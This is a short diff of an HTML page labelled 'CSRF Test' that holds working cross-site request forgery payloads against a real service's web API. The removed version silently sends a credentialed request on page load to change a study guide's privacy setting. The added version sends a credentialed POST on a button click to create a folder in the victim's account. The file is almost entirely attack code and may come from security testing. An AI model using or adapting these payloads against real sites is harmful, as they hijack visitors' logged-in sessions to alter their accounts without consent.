@@ -1,20 +1,26 @@
+<!DOCTYPE html>
 <html>
-  <body onload="submitForm()">
+  <body>
+    <h3>CSRF Test</h3>
+    <button onclick="send()">Click to send CSRF</button>
+
     <script>
-      function submitForm() {
-        fetch("https://quizlet.com/webapi/3.11/study-guides/32e3d72c-15a4-4fb7-9181-f5aa50e98ef9", {
-          method: "PUT", // Using PUT method here
-          credentials: "include", // Important! This will send the session cookies with the request
+      function send() {
+        fetch("https://quizlet.com/webapi/3.1/folders/save?_method=POST", {
+          method: "POST",
+          credentials: "include",
           headers: {
-            "Content-Type": "application/json", // Content type for sending JSON data
+            "Content-Type": "application/json"
           },
           body: JSON.stringify({
-            private: true, // This is the data you want to modify (privacy setting)
+            data: [
+              {
+                name: "api2",
+                description: ""
+              }
+            ]
           })
-        })
-        .then(response => response.json()) // If needed, process the response
-        .then(data => console.log("Privacy settings updated", data)) // Optional, for debugging
-        .catch(error => console.error("Error in request:", error)); // Optional, for error handling
+        }).then(r => console.log("Response status:", r.status));
       }
     </script>
   </body>
